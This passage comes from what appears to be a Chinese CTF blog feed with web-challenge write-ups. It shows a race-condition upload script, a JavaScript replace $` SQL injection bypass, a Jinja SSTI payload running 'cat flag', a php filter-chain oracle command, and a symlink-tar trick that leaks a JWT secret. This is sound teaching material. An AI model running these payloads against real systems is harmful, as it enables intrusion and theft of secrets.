cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span>        <span class="token comment"># 提取文件名并保存到本地文件</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'./Uploads/1f14bba00da3b75118bc8dbf8625f7d0/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/p>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'name.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 strip() 去除可能的换行符</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无法提取文件路径或文件上传失败"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url0 <span class="token operator">=</span> <span class="token string">'http://139.155.126.78:30675/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/'</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 直接读取文件内容，去除换行符并逐行处理</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'name.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            shellpath <span class="token operator">=</span> url0 <span class="token operator">+</span> filename<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 使用 strip() 去除换行符</span>             <span class="token comment"># 发起 GET 请求</span>            r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellpath<span class="token punctuation">)</span>             <span class="token comment"># 如果状态码不是 404，输出状态码和响应文本</span>            <span class="token keyword">if</span> r1<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">404</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个脚本多开点才行</p><p>合着就是线程少了竞争不来是吧</p><hr><h1 id="sqli-or-not（复现）"><a href="#sqli-or-not（复现）" class="headerlink" title="sqli or not（复现）"></a>sqli or not（复现）</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hacker1!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>username<span class="token operator">&amp;&amp;</span>info<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> username <span class="token operator">=</span> info<span class="token punctuation">.</span>username<span class="token punctuation">;</span>            <span class="token keyword">var</span> password <span class="token operator">=</span> info<span class="token punctuation">.</span>password<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|\"|\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> info<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|\"|\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hacker2!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>            sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>            sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>            connection<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>rs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'error1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>rs<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'username or password error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"please input the data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"please input the data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要返回成功即可得到flag</p><p>我们传进去的参数是info，内容是json</p><p>首先是第一个waf，匹配<code>,</code>，只需要url编码即可绕过</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"1"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后是第二个waf，匹配的是 info 里的<code>&#39;</code>，<code>&quot;</code>，<code>\\</code></p><p>要想注入的话肯定要一个<code>&#39;</code>或者<code>\</code>来转义，</p><p>期望的sql语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from userinfo where username &#x3D; &#39;1&#39;&#39; and password &#x3D; &#39;;select 1--&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是测了半天都转义不出想要的效果</p><br><h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h2><p>估计是要从 replace 入手，模板字符串替换的写法感觉有说法</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看一下replace的源码：</p><pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token comment">/** * Replaces text in a string, using this regular expression. * @param string A String object or string literal whose contents matching against *               this regular expression will be replaced * @param replacer A function that returns the replacement text. */</span><span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>replace<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token function-variable function">replacer</span><span class="token operator">:</span> <span class="token punctuation">(</span>substring<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>replace 支持正则表达式，在MDN文档里能找到内置的正则静态属性：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext</a></p><blockquote><p><strong>leftContext</strong> 非标准属性是正则表达式的静态和只读属性，含有最新匹配的左侧子串。 RegExp.$&#96; 是这个属性的别名。</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">RegExp<span class="token punctuation">.</span>leftContextRegExp<span class="token punctuation">[</span><span class="token string">'$`'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>返回</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就拿到我们需要的<code>&#39;</code>了</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from userinfo where username &#x3D; &#39;select * from userinfo where username &#x3D; &#39;&#39; and password &#x3D; &#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后构造注入得到payload：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"or 1%23"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118165020071.png" alt="image-20250118165020071"></p><p>然后就会下载到flag了（这里可以知道数据库不是sqlite，sqlite的注释符是<code>--</code>）</p><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174053483.png" alt="image-20250118174053483"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;所以 已经没事了😄&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://blog.csdn.net/uuzeray/article/details/145228235&quot;&gt;https://blog.csdn.net/uuzeray/article/details/145228235&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024春秋杯冬季赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</id>
    <published>2025-01-17T02:31:51.000Z</published>
    <updated>2025-01-19T11:35:37.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你什么比赛你撞西湖论剑（</p><p>day2的题没做，放着不管！</p><span id="more"></span><hr><h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h1><p>直接ssti秒了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="file-copy"><a href="#file-copy" class="headerlink" title="file_copy"></a>file_copy</h1><p>文件复制，支持伪协议，但是除了文件大小就没有其他回显，测出来 flag 在&#x2F;flag</p><p>那明显是侧信道盲注</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 filters_chain_oracle_exploit.py <span class="token parameter variable">--target</span> http://eci-2ze470339l9n5s7flrul.cloudeci1.ichunqiu.com/ <span class="token parameter variable">--parameter</span> path <span class="token parameter variable">--file</span> /flag <span class="token parameter variable">--time_based_atta</span>ck True <span class="token parameter variable">--match</span> <span class="token string">"Allowed memory size"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117111643538.png" alt="image-20250117111643538"></p><hr><h1 id="Gotar（复现）"><a href="#Gotar（复现）" class="headerlink" title="Gotar（复现）"></a>Gotar（复现）</h1><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"Gotar/config"</span><span class="token string">"Gotar/controllers"</span><span class="token string">"Gotar/db"</span><span class="token string">"Gotar/middleware"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span><span class="token function">LoadEnv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>db<span class="token punctuation">.</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/assets/"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">StripPrefix</span><span class="token punctuation">(</span><span class="token string">"/assets/"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FileServer</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"assets"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>IndexHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>RegisterHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>LoginHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>LogoutHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>UploadHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/files"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>FilesHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/download/"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>DownloadHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Server started on http://localhost:80"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传功能是上传一个tar包并解压</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> <span class="token punctuation">(</span>uploadDir    <span class="token operator">=</span> <span class="token string">"./assets/uploads"</span>extractedDir <span class="token operator">=</span> <span class="token string">"./assets/extracted"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上传目录和解压目录</p><p>思路应该是先获取 .env 的 jwt_key，然后伪造成admin下载flag</p><p>思考 html&#x2F;template 的 ssti，但是没有注入点</p><p>那就文件上传，奇怪的是我用linux压缩的tar全部解压失败，原来是多加了个 z 参数（</p><p>尝试在 windows 这里压缩一个tar包，发现能上传解压了，但是下载全部失败</p><p>本地调试一下，我们上传文件时会执行这样一条sqlite语句</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;users&#96; WHERE &#96;users&#96;.&#96;id&#96; &#x3D; 2 AND &#96;users&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;users&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载时点击文件执行的url：<code>download/1/.env</code>，其sql语句是</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;files&#96; WHERE (id &#x3D; &quot;1&#x2F;.env&quot; AND user_id &#x3D; 1) AND &#96;files&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;files&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>1/.env</code>这玩意在 id 上明显是返回 false</p><p>那么这里说不定能构造sql注入，试了一下发现<code>&quot;</code>会自动补成对</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;files&#96; WHERE (id &#x3D; &quot;&quot;&quot;)or+select+1--&quot; AND user_id &#x3D; 1) AND &#96;files&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;files&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>遂放弃</p><p>观察下登录接口处的操作：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">result <span class="token operator">:=</span> db<span class="token punctuation">.</span>DB<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token string">"username = ?"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;users&#96; WHERE username &#x3D; &quot;123&quot;&quot;)))--&quot; AND &#96;users&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;users&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也是没法注入的，于是注入似了</p><p>尝试软链接到 .env，但是解压就报错<code>Failed to extract file: symlink /app/.env assets/extracted/2: file exists</code>了，不懂</p><br><p>原来是因为软链接需要先套一层文件夹再上传，否则这里 assets&#x2F;extracted&#x2F;2 就直接指向 &#x2F;app&#x2F;.env 了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token function">ln</span><span class="token builtin class-name">cd</span> <span class="token function">ln</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /app/.env <span class="token builtin class-name">test</span><span class="token function">tar</span> <span class="token parameter variable">-cvf</span> ln.tar <span class="token function">ln</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问静态目录 &#x2F;assets&#x2F;extracted&#x2F;2&#x2F;test 得到 .env</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">JWT_SECRET</span><span class="token operator">=</span>SfaVqVGfLOKk7Gp912kPe0Li47AEQM4iYNbBx1WVrWA<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来伪造admin即可，注意 UserID 也要改成 1</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117224334850.png" alt="image-20250117224334850"></p><p>读flag</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117224547947.png" alt="image-20250117224547947"></p><hr><h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h1><p>文件上传，flag就在web目录下，先看上传规则</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    